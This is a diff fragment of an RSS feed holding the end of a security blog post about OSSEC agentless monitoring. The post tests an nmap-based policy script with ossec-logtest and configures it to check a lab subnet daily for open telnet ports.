+       extra_data: &#39;Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;
+
+**Phase 3: Completed filtering (rules).
+       Rule id: &#39;10011&#39;
+       Level: &#39;11&#39;
+       Description: &#39;Agentless.&#39;
+**Alert to be generated.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see from the output that a level 11 alert would be generated
+for the line we just tested with &lt;code&gt;ossec-logtest&lt;/code&gt;. In the case of the
+full output of the &lt;code&gt;nmap_policy&lt;/code&gt; script it has 13 &lt;code&gt;LOG:&lt;/code&gt; lines returned
+and would have generated 13 alerts. Needless to say this is a lot of
+alerts, so it&amp;rsquo;s up to you to tune and configure this correctly for your
+environment.&lt;/p&gt;
+
+&lt;p&gt;In our lab here at &lt;a href=&#34;http://www.praetoriansecuritygroup.com&#34;&gt;Praetorian&lt;/a&gt;
+we don&amp;rsquo;t ever want to see the telnet port open. So lets make this script
+live, but only checking for telnet. I am going to once again make use of
+&lt;a href=&#34;http://bitbucket.org/jrossi/ossec-hids-tools/&#34;&gt;ossec-hids-tools&lt;/a&gt; to add
+the new agentless monitoring. As is always the case a restart of OSSEC
+will be needed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --add --host jrossi@172.17.20.0 --type nmap_policy 
+--frequency 86400 --state periodic --argv &amp;quot;-p 23 -n 172.17.20.0/24&amp;quot;
+obsd46# (cd /var/ossec &amp;amp;&amp;amp; ./bin/ossec-control restart )
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;While adding this new agentless script I had to specify a &lt;code&gt;--host&lt;/code&gt;
+argument. This is required for OSSEC agentless as the host field is
+&lt;strong&gt;NOT&lt;/strong&gt; optional. In the case of the script &lt;code&gt;nmap_policy&lt;/code&gt; it will have
+no effect, but this needs to be taken into account when writing your own
+scripts as the first argument passed will always be what you specified
+as the host.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
